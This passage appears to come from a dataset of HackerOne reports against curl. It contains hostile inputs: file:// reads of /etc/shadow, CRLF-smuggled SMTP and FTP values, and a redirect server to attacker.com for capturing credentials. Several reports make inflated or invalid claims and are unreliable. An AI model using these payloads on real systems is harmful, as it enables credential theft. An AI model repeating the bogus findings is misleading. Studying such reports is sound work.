<openssl/err.h>\n=======================\n\ninclude <stdio.h>\n=================\n\ninclude <stdlib.h>\n==================\n\nvoid my\\_keylog\\_cb(const SSL *ssl, const char* line) {\nprintf(\"Keylog callback: %s\\n\", line);\n// UAF: SSL already freed\nvoid *ptr = SSL\\_get\\_ex\\_data((SSL* )ssl, 0); // cast to remove const\nprintf(\"Data: %p\\n\", ptr);\n}\n\nint main() {\nSSL\\_library\\_init();\nSSL\\_load\\_error\\_strings();\n\nSSL\\_CTX \\*ctx = SSL\\_CTX\\_new(TLS\\_client\\_method());\nSSL\\_CTX\\_set\\_keylog\\_callback(ctx, my\\_keylog\\_cb);\n\nSSL \\*ssl = SSL\\_new(ctx);\n\nint idx = SSL\\_get\\_ex\\_new\\_index(0, \"mydata\", NULL, NULL, NULL);\nchar \\*data = strdup(\"hello\");\nSSL\\_set\\_ex\\_data(ssl, idx, data);\n\nSSL\\_free(ssl); // Free SSL\n\n// Trigger callback after free\nmy\\_keylog\\_cb(ssl, \"CLIENT\\_RANDOM deadbeef...\");\n\nSSL\\_CTX\\_free(ctx);\nfree(data);\nreturn 0;\n}\n\n2. Run the binary:\n\n$ ./segv\nKeylog callback: CLIENT\\_RANDOM deadbeef...\nData: 0x0\nSegmentation fault\n\nWas an AI involved?\n\nNo, the bug was discovered through manual auditing and testing.\nHowever, AI (ChatGPT) was used only to assist in writing documentation and estimating CVSS/weakness classification (e.g., [CWE-416](/hacktivity/cwe_discovery?id=cwe-416)).\n\nImpact\n------\n\nUnder specific conditions (when keylog callback is configured), it results in a segmentation fault (DoS). If further heap grooming or ex\\_data abuse is possible, this may lead to code execution."
},
{
    "url": "https://hackerone.com/reports/3242087",
    "original_report": "cURL’s file:// protocol handler is enabled by default, allowing access to local files on the system. This behavior enables an attacker with the ability to run cURL commands to read arbitrary files on the host by specifying file paths or using directory traversal techniques.\n\nSteps to reproduce:\n\n1. Build cURL with default configuration (e.g., ./configure --with-ssl and make).\n\n2. Run ./src/curl \"file:///etc/passwd\" to read the contents of the passwd file.\n\n3. Run ./src/curl \"file:///tmp/../../etc/passwd\" to demonstrate path traversal access to the same file.\n\n4. Run ./src/curl -s \"file:///etc/shadow\" | head -c20 to read partial sensitive data from the shadow file.\n\nThis confirms that arbitrary local files can be accessed via the file:// protocol, which poses a critical security risk.\n\nImpact\n------\n\nAn attacker who can run cURL commands on the system can read any local file that the user running cURL has permission to access, including highly sensitive files such as /etc/shadow. This can lead to:\n\nTheft of password hashes and credentials.\n\nPotential privilege escalation by cracking stolen hashes.\n\nFull system compromise through lateral movement or further exploitation.\n\nExposure of confidential configuration or secret files.\n\nOverall, this vulnerability compromises system confidentiality and can lead to complete takeover of the affected host."
},
{
    "url": "https://hackerone.com/reports/3241304",
    "original_report": "[https://web.archive.org/web/\\*/https://github.com/curl/curl](https://web.archive.org/web/*/https://github.com/curl/curl)\n\nImpact\n------\n\nSummary:\n--------\n\naccess notes without permission"
},
{
    "url": "https://hackerone.com/reports/3241308",
    "original_report": "<https://github.com/curl/curl/blob/master/.mailmap>\n\nImpact\n------\n\nSummary:\n--------\n\nDisclosure of email addresses"
},
{
    "url": "https://hackerone.com/reports/2859735",
    "original_report": "Summary:\n--------\n\nWhen curl command is used with `--continue-at`, the `--no-clobber` is unexpectedly ignored and curl will append the output to the target file, even if it already exists. If `--continue-at` is used with`--remove-on-error` it can lead to unexpected removal of the file on early errors. Note that this also happens when combined with `--remote-name` and `--remote-header-name`.\n\nSteps To Reproduce:\n-------------------\n\n### Tampering a file even if `--no-clobber`:\n\n1. `echo not to be touched > robots.txt`\n2. `curl --no-clobber -C 1 -O https://curl.se/robots.txt`\n\nNOTE: Without `-C 1` the output is written to `robots.txt.<n>`.\n\n### Deleting a file when combining `--remove-on-error` with `--continue-at`:\n\n1. `echo something > important`\n2. `curl --remove-on-error -C 1 -o important https://nonexisting.curl.se/`\n\nNOTE: Without `-C 1` the file is not removed.\n\nRemediation\n-----------\n\nThe easiest way to stop these issues from happening is to forbid use of `--continue-at` in combination with `--no-clobber` or `--remove-on-error`.\n\nImpact\n------\n\nUnexpected modification or deletion of an existing file."
},
{
    "url": "https://hackerone.com/reports/2853023",
    "original_report": "## Summary:\n===========\n\nDuring a security assessment, it was discovered that email addresses were exposed in a publicly accessible location. The data was retrieved using standard tools, such as curl, without requiring authentication or special permissions. This raises a concern regarding the confidentiality of sensitive user information.\n\n## Steps To Reproduce:\n======================\n\nThe following email addresses were disclosed:  \nat : <https://curl.se/.mailmap>\n\n1. Andy Alt: [arch\\_stanton5995@protonmail.com](mailto:arch_stanton5995@protonmail.com)\n2. Ali Khodkar: [129806877+Alikhodkar@users.noreply.github.com](mailto:129806877+Alikhodkar@users.noreply.github.com)\n\n## Supporting Material/References:\n==================================\n\ngo to : <https://curl.se/.mailmap>\nnow add you payload\n\nImpact\n------\n\nExposing email addresses can lead to phishing attacks, spam, or social engineering attacks targeting the affected individuals.\n\nIf these emails are linked to privileged accounts (e.g., administrative roles or GitHub contributors), this exposure increases the risk of further exploitation, such as impersonation or unauthorized account access."
},
{
    "url": "https://hackerone.com/reports/2841436",
    "original_report": "Summary:\n--------\n\nweb.archive.org -website\nweb. Archive is a website like google search, but he saves all links. Wayback disclosing URL's without users' permission,\n\nAnyone can access them maybe (emails and passwords) they are notes they should be private and see everything\njust by searching about random notes\nand it doesn't work like that , its should be:\nonly people who i want them to see my notes can access them\nnot any random people find my notes on web.archive.org/\n\nurl : [https://web.archive.org/web/\\*/https://github.com/curl/curl](https://web.archive.org/web/*/https://github.com/curl/curl)*url : <https://web.archive.org/web/>*/<https://curl.se>\\*\n\nFix:\nblock web.archive.org from disclose your websites.\nso i really hope you will review that and fix it to keep your users safe because they maybe save emails or passwords or company information's and they want to share them only with company employers, i will wait an update from you :)\n\nImpact\n------\n\nattacker can access notes without permission"
},
{
    "url": "https://hackerone.com/reports/2831558",
    "original_report": "Summary:\n--------\n\nCurl allows `CR` and `LF` characters to be encoded in `login` and `password` netrc fields. This allows an attacker who can affect contents of the netrc entry to inject FTP commands by injecting CRLF to the `login` or `password`. POP3 is likely affected as well, but hasn't been tested.\n\nThe only situation in which this could be considered a vulnerability is when someone can choose their username or password freely which will then be injected to a netrc file. This could happen for example if some app constructs the netrc file from user provided input.\n\nThis likely is considered \"Local attackers already present\" category issue. However, I leave it to the project to decide. If not deemed a security issue, I'll close the ticket and the issue can fixed outside of the security process as a normal bug.\n\nSteps To Reproduce:\n-------------------\n\n1. Have netrc file with:\n\n2. `echo -ne \"220 \\r\\n331 \\r\\n\" | nc -v -l -p 9999`\n3. `curl -v --netrc-file netrc ftp://localhost:9999`\n\nRemediation suggestion\n----------------------\n\nDo not allow `CR` or `LF` in the username or password when constructing commands for protocols that use these characters as separator (FTP, POP3, others?).\n\nImpact\n------\n\nFTP/POP3 command injection."
},
{
    "url": "https://hackerone.com/reports/2861797",
    "original_report": "Summary:\n--------\n\nHello,\n\nActually, this bug was found unexpectedly during some security audits on a private asset, we found some differences on how burp proxy/python's requests library handles the asset's HTTP responses on a certain endpoint and how curl handles the same HTTP responses, the bug arises when curl treats `%0c and %0b sequences` literally regardless how web servers respond to these characters, the mentioned asset was well-protected against CRLF injections as we didn't had success to inject headers/cookies using the known `%0a%0b` sequence, curl also didn't respond to our payloads as we hope, however, we tried using other non-printable characters, curl unexpectedly responded to our request using `%0c` with the following response:\n\nusing `%0c%0b` sequences:\n\nWhile Burp responded differently:\n\nPython's requests library responded also differently:\n\nEven a random HTTP response viewer service on the public internet responded differently:\n\nWe found that you resolved the main CRLF issue (with %0a%0d) since 2012 with assigning [CVE-2012-0036](https://curl.se/docs/CVE-2012-0036.html) to the security advisory published on your docs, **but** we think that our report describes a bug that makes CRLF indirectly possible again, with the high support for curl implementations in the most commonly used programming languages; the mentioned behavior could make some confusion when receiving HTTP responses from curl leading to unsafe CRLF treatment and thus allowing Headers/Cookies Injection.\n\nImpact\n------\n\nCRLF confusions, Header Injection, Cookie Injection.\n\nRegards,\n\nMoaad ([@mdakh404](/mdakh404)), Abdelkarim ([@mchklt](/mchklt))"
},
{
    "url": "https://hackerone.com/reports/2864414",
    "original_report": "Summary:\n--------\n\nThe curl source code's testing scripts contain instances where the os.unlink() function is used to delete files without validating the input file paths. This introduces a risk of arbitrary file deletion when these scripts are executed with malicious or manipulated inputs. Although the vulnerability is present in test scripts, it could lead to unintended consequences if these scripts are used in shared or automated environments.\n\nSteps To Reproduce:\n-------------------\n\n1.Clone the curl repository using (<https://github.com/curl/curl.git>)\n2.move to tests directory.\n3.Identify the affected scripts:\nThe following scripts and lines contain vulnerabilities:\ntests/negtelnetserver.py (Line 366)\ntests/dictserver.py (Line 183)\ntests/smbserver.py (Lines 96, 450)\n4.Simulate malicious input:\n--> Identify the specific script and input options (e.g., options.pidfile) in the affected code.\n--> Modify the options.pidfile or related variable to point to a sensitive system file (e.g., /etc/passwd).\n--> Trigger the script which leads to leading to the deletion of the specified file.\n\nEdit a script to simulate an attacker-controlled input. For example, in\nnegtelnetserver.py:\n# Original code:\nos.unlink(options.pidfile)\n# Malicious input simulation:\noptions.pidfile = \"/etc/passwd\" # Replace this with a critical or sensitive file\nos.unlink(options.pidfile)\n5.Run the vulnerable script:\nExecute the script after modifying the input.\npython3 negtelnetserver.py\n6. Observe the results:\nWhen script is executed, which is leading to deletion of the specified file.\n\nSupporting Material/References:\n-------------------------------\n\n[CWE-20](/hacktivity/cwe_discovery?id=cwe-20): Improper Input Validation\nExample: Allowing user-controlled values for options.pidfile without ensuring they refer to a valid file in an allowed directory.\n\n[CWE-22](/hacktivity/cwe_discovery?id=cwe-22): Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)\nExample: An attacker supplies a path like ../../../etc/passwd for deletion.\n\n[CWE-732](/hacktivity/cwe_discovery?id=cwe-732): Incorrect Permission Assignment for Critical Resource\nExample: Allowing os.unlink() to execute on sensitive files.\n\n[CWE-552](/hacktivity/cwe_discovery?id=cwe-552): Files or Directories Accessible to External Parties\nExample: Allowing external parties to set options.pidfile to a sensitive file path.\n\n[CWE-610](/hacktivity/cwe_discovery?id=cwe-610): Externally Controlled Reference to a Resource in Another Sphere\nExample: Allowing the attacker to specify arbitrary file paths for deletion.\n\nImpact\n------\n\nUnvalidated file paths passed to os.unlink() may allow an attacker to:\nDelete arbitrary files, potentially causing system instability or downtime.\nTarget critical system files for deletion (Ex:logs, configuration files).\nAffect multi-user systems by deleting files belonging to other users."
},
{
    "url": "https://hackerone.com/reports/2864859",
    "original_report": "Summary:\n--------\n\nHi team,\nI hope you're doing well.\n\nRecently I came accross this weird curl behavior where -H \"[space]header: value\" would inject the header in the previous HTTP header.\n\nTried it on mac OS Sequoia 15.1 with curl version\n\nWeirdly, this only seems to work when --proxy argument exists.\n\nSteps To Reproduce:\n-------------------\n\nResulting request:\n\nwhen the first header itself contains space, the behavior will again be to attach to previous header:\n\nWithout proxy argument however, the behavior is normal and it will send them in new lines:\n\nResulting request:\n\nThis also works with -H [@file](/file).txt where the file begins with the space.\n\nI do not have an exact scenerio where this can be exploited, however, since curl is so widely used, I can imagine a scenerio where [@file](/file).txt or a single header name input may be attacker controlled in someway, which can lead to malformed requests to servers.\n\nAlso, if request like this is sent:\n\nThe headers will directly attach to Host header, which may lead to incorrect logging, and introduce other issues depending upon the program.\n\nSince, headers field-name can't contain spaces anyway, stripping them and always adding them to new line would be prefect solution.\n\nImpact\n------\n\nPrevious header/ previous line injection via -H"
},
{
    "url": "https://hackerone.com/reports/2904921",
    "original_report": "**Summary**\nThe Bandit tool flagged the usage of the `subprocess`module in the file `curl.py`under the **B404:blacklist rule**. This rule highlights potential security risks associated with using the subprocess module without proper sanitization of inputs, which can lead to command injection vulnerabilities.\n\nThe specific issue appears in the code where subprocess.Popen and subprocess.run are used to execute system-level commands. If user inputs or other untrusted data are passed directly into these subprocess calls without validation, this can allow malicious actors to inject arbitrary commands, potentially compromising the security of the system.\n\n**Affected Code**\nThe flagged code occurs in the curl.py file as follows:\n\nimport subprocess\n\n`# Code where subprocess is used to execute system commands`\n`p = subprocess.Popen(args, stderr=cerr, stdout=cout,`\n `cwd=self._run_dir, shell=False, env=self._run_env)`\n\n`p = subprocess.run(args, stderr=cerr, stdout=cout,`\n`cwd=self._run_dir, shell=False,`\n`input=intext.encode() if intext else None,`\n `timeout=self._timeout,`\n`env=self._run_env)`\n\n**Location in the file:**\nFile: `curl.py`\n\n**Explanation of the Vulnerability**\nThe subprocess module provides a way to spawn new processes and interact with them. While it is powerful, it also poses a security risk if used improperly. Specifically:\n\n**Command Injection**: If the arguments passed to `subprocess.Popen` or `subprocess.run` include untrusted user input, an attacker could potentially inject arbitrary commands, leading to the execution of malicious code on the system.\n**Improper Input Handling**: The code does not sanitize or validate the inputs passed to these subprocess functions. This leaves the system open to attacks if any of the input parameters (`args`, `intext`, etc.) can be manipulated by untrusted sources.\n\nIn the affected code, `args` and `intext` are passed directly into subprocess calls. If these inputs are derived from user input, environment variables, or external sources without validation, an attacker could craft malicious input that would be executed by the subprocess, leading to a potential security breach.\n\nImpact\n------\n\n**Command Injection**: An attacker could inject arbitrary system commands into the args or intext variables. These injected commands would be executed with the privileges of the process running the Python code.\n**Remote Code Execution (RCE)**: In the worst case, if the application is running with elevated privileges (e.g., root or administrator), an attacker could exploit this vulnerability to execute arbitrary commands on the system, potentially leading to full remote code execution.\n**Denial of Service (DoS)**: If an attacker provides a command that causes the system to crash or hang, this could lead to a denial of service, affecting the availability of the system or application."
},
{
    "url": "https://hackerone.com/reports/2915426",
    "original_report": "Summary:\n--------\n\nHello team ,\nWhen i research I found domain vuln to downliad git repository and i will explain that.\n\nSteps To Reproduce:\n-------------------\n\n1. Add DotGit extention on your browser\n2. Now try to access to that domain <https://curl.dev/>\n3. You will show that extention is alert and can download that bucket.\n\nImpact\n------\n\nSummary:\n--------\n\nThe exposure of the /.git directory can lead to unauthorized access to sensitive information, such as source code, configuration files, and potentially secrets or credentials stored in the repository."
},
{
    "url": "https://hackerone.com/reports/3238249",
    "original_report": "Summary:\nThe HTTP/2 proxy implementation in curl contains potential integer overflow vulnerabilities in buffer size calculations that could lead to memory corruption or denial of service.\n\nAI Usage Statement:\nThis report was prepared by a human security researcher after manual code review. No AI was used to generate this report.\n\nAffected Version:\nAll curl versions containing the HTTP/2 proxy implementation (since introduction of the feature). Tested with curl 8.6.0 on Linux x86\\_64.\nExamine the window size calculations in cf-h2-proxy.c:\n#define PROXY\\_H2\\_CHUNK\\_SIZE (16*1024)\n#define H2\\_TUNNEL\\_WINDOW\\_SIZE (10*  1024 \\* 1024)\n#define PROXY\\_H2\\_NW\\_RECV\\_CHUNKS (H2\\_TUNNEL\\_WINDOW\\_SIZE / PROXY\\_H2\\_CHUNK\\_SIZE)\n\nThe calculation H2\\_TUNNEL\\_WINDOW\\_SIZE / PROXY\\_H2\\_CHUNK\\_SIZE could overflow if either value is manipulated via malicious HTTP/2 frames.\n\nnghttp2\\_session\\_set\\_local\\_window\\_size(ctx->h2, NGHTTP2\\_FLAG\\_NONE, 0,\nPROXY\\_HTTP2\\_HUGE\\_WINDOW\\_SIZE);\nuses a 100MB window size (PROXY\\_HTTP2\\_HUGE\\_WINDOW\\_SIZE) which could lead to memory exhaustion.\n\nSupporting Material/References:\n\nThe vulnerable code is in lib/cf-h2-proxy.c in the curl source repository\n\nSimilar vulnerabilities have been found in other HTTP/2 implementations ([CVE-2019-9511](/hacktivity/cve_discovery?id=CVE-2019-9511), [CVE-2019-9513](/hacktivity/cve_discovery?id=CVE-2019-9513))\n\nImpact\n------\n\nAn attacker controlling a malicious HTTP/2 proxy server could potentially:\n\nCause integer overflows leading to memory corruption\n\nTrigger resource exhaustion via extremely large window sizes\n\nCause denial of service through crafted window size advertisements\n\nThe impact is limited to:\n\nSystems using curl with HTTP/2 proxy support enabled\n\nWhen connecting to untrusted or compromised HTTP/2 proxies\n\nRequires the attacker to be in a MITM position or control the proxy server\n\nRecommended Fixes\nAdd bounds checking for window size calculations\n\nImplement reasonable maximum limits for window sizes\n\nAdd validation of window size advertisements from peers\n\nConsider using saturating arithmetic for size calculations\n\nAdditional Information\nThis vulnerability was discovered through manual code review focusing on integer handling in the HTTP/2 proxy implementation. The risk is somewhat mitigated by the fact that it requires proxy server compromise or MITM position, but the potential impact justifies addressing these issues.\n\nThe vulnerability shares characteristics with known HTTP/2 implementation flaws that have been exploited in other software (e.g., nghttp2, Apache HTTP Server)."
},
{
    "url": "https://hackerone.com/reports/2981303",
    "original_report": "Summary:\n--------\n\nThis vulnerability occurs when the `--ciphers` option is used with the `curl` command to manually specify TLS cipher suites. HTTP/3 or QUIC fails to function in this scenario because QUIC does not rely on traditional TLS cipher suites defined for TLS 1.2 or earlier. Consequently, using the `--ciphers` option causes connection failures when attempting to access endpoints that exclusively support HTTP/3 or QUIC.\n\n1. curl Implementation: The --ciphers option in curl does not distinguish between traditional TLS protocols (TLS 1.2/1.3) and QUIC, leading to configuration conflicts when specifying incompatible cipher suites.\n2. Protocol Mismatch: HTTP/3 utilizes QUIC, which does not operate with traditional TLS cipher suites specified by the --ciphers option.\n\nAffected version\n----------------\n\nSteps to Reproduce:\n-------------------\n\nEven if I restrict the length of --ciphers argument, it still doesn't work.\ncurl --disable -v --http3-only --ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256' <https://1.1.1.1/cdn-cgi/trace>\n\nSupporting Material/References:\n-------------------------------\n\n<https://github.com/curl/curl/issues/16232>\n\nImpact\n------\n\nUsers attempting to use curl with the --ciphers option for HTTP/3 or QUIC connections encounter connection failures.\nThis issue may disrupt automation or scripts relying on curl to interact with HTTP/3/QUIC servers."
},
{
    "url": "https://hackerone.com/reports/3235428",
    "original_report": "Summary:\n--------\n\nlibcurl's SMTP client is vulnerable to CRLF injection via the `--mail-from` and `--mail-rcpt` parameters.\nAn attacker can inject newline characters to smuggle SMTP commands like `VRFY`, potentially enabling user enumeration or protocol abuse.\nWhile curl may fail after injection, the injected commands are executed by the SMTP server, confirming the vulnerability.\n\n### AI statement\n\nYes, I have used AI to find the vulnerability.\n\nAffected version\n----------------\n\nI have tested on Ubuntu 24.04.2 with:\n\n* curl 8.5.0 (system)\n* curl 8.15.0-DEV (my local build)\n* PycURL/7.45.6 with libcurl/8.12.1-DEV\n\nThe full system curl version:\n\nThe full local build version:\n\nSteps To Reproduce:\n-------------------\n\n1. run a test SMTP server; the one I used is listed below named `smtp_server`, ran as `./smtp_server` and listened at `localhost:1025`\n2. send an email with normal email addresses, something like: `curl -vf --url \"smtp://localhost:1025/\" --mail-from \"attacker@example.com\" --mail-rcpt \"recipient@example.com\" --upload-file mail.txt` where `mail.txt` is a text file -- curl finishes normally\n3. now send an email with injected CRLF's, for example in the \"from\" field, something like: `curl -vf --url \"smtp://localhost:1025/\" --mail-from \"$(printf 'user@example.com\\r\\nVRFY d@example.com\\r\\n')\" --mail-rcpt \"recipient@example.com\" --upload-file mail.txt` -- curl fails with `DATA failed: 250` as the server sent `250 OK ...` to the injected `VRFY` command instead of expected `354`; this is demonstrating a CRLF injection took place\n\nI believe the problem arises since `\"MAIL FROM:%s%s%s%s%s%s\"` in `smtp_perform_mail` in `smtp.c` concatenates mail fields without sanitization (and `smtp_parse_address` does not sanitize \"\\r\\n\" either).\n\nSupporting Material/References:\n-------------------------------\n\nNormal mail send:\n\nSending with CRLF in \"from\" field:\n\nSending with CRLF in \"rcpt\" field:\n\nSending with CRLF using `pycURL`:\n\nServer logs (for the illustration):\n\n`smtp_server` script:\n\n`send-with-pycurl` script:\n\nImpact\n------\n\nSummary:\n--------\n\nThis vulnerability allows attackers to inject arbitrary SMTP commands, like VRFY, by crafting malicious email addresses. It can lead to user enumeration, bypass of client-side restrictions, or disruption of the SMTP session, especially in automated or proxy-based email workflows."
},
{
    "url": "https://hackerone.com/reports/3000639",
    "original_report": "Summary:\n--------\n\n`cleanarg` helper func doesn't work, when credentials are provided without a whitespace to a short options flag, e.g. `-uUSER:PASS` vs `-u USER:PASS` or `-UUSER:PASS` vs `-U UUSER:PASS`\n\nAffected version\n----------------\n\nSteps To Reproduce:\n-------------------\n\n[add details for how we can reproduce the issue]\n\nRun these commands in Linux environment (tested in zsh, bash, posix sh)\n\n1. run curl `curl 8.8.8.8:444 -u user:pass -ufoo:bar -U baz:qux -U123:456 --user USER:PASS` using root or other user\n2. run `ps ax` in another terminal on the same host under another unprivileged user:\n\n\n\nSupporting Material/References:\n-------------------------------\n\n[list any additional material (e.g. screenshots, logs, etc.)]\n\nInitial implementation: <https://github.com/curl/curl/commit/7f67a28c2a2ee81b0998e57a10bccbdfe9078fd7>\nDocumentation discussion <https://github.com/curl/curl/issues/3680>, a note added into docs <https://github.com/curl/curl/commit/2af732f364e4734a5a5fd432c77a374e84e5d76c>\n\nImpact\n------\n\nSummary:\n--------\n\ncurl fails to mask sensitive arguments (e.g., passwords) when passed via the command line without a whitespace separator. As a result, these arguments remain visible in system process listings (ps aux, /proc/<pid>/cmdline), posing a security risk.\n\nImpact:\nAny user on the system can view sensitive information by inspecting running processes. This can lead to unauthorized access, credential leaks, and potential security breaches."
},
{
    "url": "https://hackerone.com/reports/2941920",
    "original_report": "Summary\n-------\n\nAn Elevation of Privileges (EoP) vulnerability can occur in a Windows privileged process that uses CURLOPT\\_COOKIEJAR, CURLOPT\\_HSTS, or CURLOPT\\_ALTSVC.\nThis vulnerability arises due to the differences in the implementation of the unlink function between Windows and Linux, as well as the behavior of MoveFileEx, which follows specially crafted links.\nGiven that many components, such as program updaters, frequently use curl with elevated privileges, this issue must be considered a serious concern.\n\nAffected version\n----------------\n\nlibcurl latest version (8.11.1)\n\nDescription\n-----------\n\nlibcurl provides easy options such as `CURLOPT_COOKIEJAR`, `CURLOPT_HSTS`, and `CURLOPT_ALTSVC`. For example, when `CURLOPT_COOKIEJAR` is set, the library user can specify a file where cookie information will be stored.\n\nSince libcurl is widely used for web communication, it is often utilized in privileged programs that need to communicate with web servers, such as program updaters.\n\nThe issue is that privileged programs using the aforementioned options may occur a Elevation of Privileges (EoP) vulnerability. Since all three options share a very similar code structure, this explanation will focus on `CURLOPT_COOKIEJAR`.\n\nIn the `cookie_output` function of `lib/cookie.c`, the output file's `FILE` pointer is obtained via `Curl_fopen`. The `Curl_fopen` function generates a random temporary file based on the file path specified by the library user through `CURLOPT_COOKIEJAR` and returns the `FILE` pointer to this temporary file.\n\nSubsequently, `cookie_output` writes the cookie contents to the temporary file and then moves the temporary file to the user-specified file path using `Curl_rename`. Internally, `Curl_rename` calls the `MoveFileExA` API, and if this attempt fails, it tries to delete the temporary file using the `unlink` function.\n(<https://github.com/curl/curl/blob/c5bb4e77e414c1505d800a0091a6d57c7f75d416/lib/cookie.c#L1660>)\n\nIf the file path for storing cookies is in a user-writable location, a specially crafted link in Windows can be used to redirect the calls to `MoveFileExA` or `unlink` to operate on an arbitrary file. The `MoveFileExA` function follows this special link as is, while the `unlink` function, which executes through the Windows C runtime (`unlink() -> remove() -> DeleteFile(WINAPI)`), also follows the link.\n\nThrough this mechanism, an attacker can leverage a privileged process to achieve **arbitrary file deletion**, which can ultimately lead to **escalation of privilege (EoP) to SYSTEM** using well-known exploitation techniques.\n\nAt first glance, it may seem that exploiting this issue requires a race condition. However, it can be exploited in a highly reliable manner using **oplocks**.\n\nFor more details on how arbitrary file deletion can be abused to escalate privileges, refer to the ZDI blog post linked below:\n(<https://www.thezdi.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks>)\n\nTo help understand this issue better, a proof-of-concept (PoC) demonstrating the vulnerability will be provided, along with step-by-step instructions on how to reproduce it in the next section.\n\nSteps To Reproduce:\n-------------------\n\n1. To reproduce the issue described above, I created a simple program (`curl_EoP.sln`) that sends a web request using libcurl and the `CURLOPT_COOKIEJAR` option.\n\n   Additionally, `curl_EoP_Exp.sln` demonstrates how this program can be exploited to achieve **high-privilege arbitrary file deletion**.\n   This exploit modifies the deletion of `\"C:/ProgramData/curl_EoP/{temporary_file_name}.tmp\"` to delete `\"C:/Windows/test_file.txt\"` instead.\n\n   ### Steps to Reproduce:\n\n   1. Open an **administrator CMD** and create `test_file.txt` by running the following command:\n   2. Use **Visual Studio C/C++ 2022** to build `curl_EoP_Exp.sln` and `curl_EoP.sln` (x64-Release).\n\n      * **Note**: `curl_EoP.sln` requires **libcurl**.\n   3. Run `curl_EoP_Exp.exe` **with normal user privileges**.\n\n      * **Ignore** any stdout output.\n   4. Run `curl_EoP.exe` **with administrator or SYSTEM privileges**.\n   5. As a result of the exploit, **`C:/Windows/test_file.txt` will be deleted**.\n\nPatch Suggestion\n----------------\n\nThe `GetFinalPathNameByHandle` API can be used to retrieve the final destination file path of a specific file handle.\n\nBy comparing this retrieved path with the expected file name, it is possible to determine whether the path has been manipulated via links.\n\nImplement a secure wrapper around functions like `MoveFileExA` and `unlink` that incorporates this logic to prevent exploitation.\n\nSupporting Material/References:\n-------------------------------\n\n* curl\\_EoP.zip: source codes of curl\\_EoP.sln\n* curl\\_EoP\\_Exp.zip: source codes of curl\\_EoP\\_Exp.sln\n* PoC.mp4: A video of reproduce steps\n\nImpact\n------\n\nSummary:\n--------\n\nA medium-privileged attacker can achieve Escalation of Privilege (EoP) to SYSTEM by targeting any privileged program that uses the CURLOPT\\_COOKIEJAR, or CURLOPT\\_HSTS, or CURLOPT\\_ALTSVC options with a user writable path."
},
{
    "url": "https://hackerone.com/reports/2946924",
    "original_report": "Curl's --location-trusted Option Leaks Authorization Header Across Domains\nThe `--location-trusted` option in Curl forwards the Authorization header when following cross-origin redirects, exposing Basic Authentication credentials to untrusted hosts.\n\n* If an attacker controls a redirecting endpoint, they can steal credentials from any requests using Basic Auth.\n* Unlike `--location`, which strips authentication headers for security, `--location-trusted` forwards them without warning, leading to unintended  \n  credential leakage.\n  This violates authentication best practices and introduces a serious security risk\n\n---\n\nAffected Versions\nRun:\n\ncurl -V\n\n**Example Output:**\n\ncurl 8.5.0 (x86\\_64-pc-linux-gnu) libcurl/8.5.0 OpenSSL/3.0.10 zlib/1.3.1\nRelease-Date: 2024-01-15\n\n**Tested on:**\n\n* Linux (Ubuntu 22.04)\n* macOS 14 Sonoma\n* Windows 11 (WSL2)\n\n---\n\n**Steps to Reproduce**\n\n**Start a Malicious Redirect Server**\nRun this Python script on an attacker-controlled machine:\npython\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\ndef do\\_GET(self):\nself.send\\_response(302)\nself.send\\_header(\"Location\", \"[http://attacker.com\"](http://attacker.com%22))\nself.end\\_headers()\n\nserver = HTTPServer((\"0.0.0.0\", 8080), RedirectHandler)\nserver.serve\\_forever()"
},
{
    "url": "https://hackerone.com/reports/3023139",
    "original_report": "Summary:\n--------\n\n[summary of the vulnerability]\n\nThere is a memory leak with FTP (see reproducer and stack trace)\nI found it via fuzzing with <https://github.com/catenacyber/curl-fuzzer/tree/proxy> (after fixing a small memory leak in curl)\n\nJust reporting a bit raw, not sure this is not just a small leak that does not go out of security vulnerabilities.\nLooks like there are 2 connections `struct connectdata *conn` and the first one of them gets cleaned by `ftp_disconnect` but the second one (with reuse from proxy) is not even if it allocates stuff in `ftp_setup_connection`\n\nI am not even sure the bug is within curl, or if it is in curl\\_fuzzer\n\nAffected version\n----------------\n\n[Which curl/libcurl version are you using to reproduce? On which platform? `curl -V` typically generates good output to include]\n\ncurl 8.13.0-DEV (x86\\_64-apple-darwin23.6.0) libcurl/8.13.0-DEV OpenSSL/1.0.2n zlib/1.2.11 libidn2/2.0.4 libpsl/0.19.1 nghttp2/1.55.1 librtmp/2.3\nRelease-Date: [unreleased]\nProtocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt pop3 pop3s rtmp rtsp smb smbs smtp smtps telnet tftp ws wss\nFeatures: alt-svc AsynchDNS HSTS HTTP2 HTTPS-proxy IDN IPv6 Largefile libz NTLM PSL SSL threadsafe TLS-SRP UnixSockets\n\nSteps To Reproduce:\n-------------------\n\n[add details for how we can reproduce the issue]\n\nRun attached fuzz reproducer with the targets built with\n\nSupporting Material/References:\n-------------------------------\n\n[list any additional material (e.g. screenshots, logs, etc.)]\n\nOutput of `FUZZ_VERBOSE=1 ./curl_fuzzer_ftp ./minimized-from-5ab60dd6d34f13da35bcebf1f965f8dd6e409e88`\n\nImpact\n------\n\nSummary:\n--------"
},
{
    "url": "https://hackerone.com/reports/3231321",
    "original_report": "### **Summary**\n\nA logic flaw in `libcurl` version **8.14.1** allows an attacker to bypass restrictive HTTP proxy firewalls by \"tunneling\" an arbitrary HTTP verb within a `CONNECT` request. By setting `CURLOPT_CUSTOMREQUEST` to `CONNECT` for a standard `http://` URL, an attacker can trick `libcurl` into creating a hybrid request. This request is misinterpreted by `CONNECT`-only proxies as a legitimate tunnel setup request and is therefore allowed. Subsequently, `libcurl` sends its request body (e.g., from `CURLOPT_POSTFIELDS`) through this newly established, unfiltered TCP pipe.\n\nThis vulnerability effectively defeats network segmentation rules enforced at the proxy layer, enabling an attacker who can control `curl` options (e.g., via SSRF) to send arbitrary data to protected internal services.\n\n|  |  |\n| --- | --- |\n| **Product Name** | libcurl |\n| **Affected Version** | **8.14.1** (and likely prior versions) |\n| **Vulnerability Class** | [CWE-284](/hacktivity/cwe_discovery?id=cwe-284) Improper access control |\n| **CVSS 3.1 Score** | **8.6 (High)** |\n| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N` |\n\n### **Description**\n\nThe vulnerability stems from insufficient validation between the user-defined request method and the request type `libcurl` assumes it is making when a proxy is in use.\n\n1. When a user provides an `http://` URL and a proxy, `libcurl` prepares a 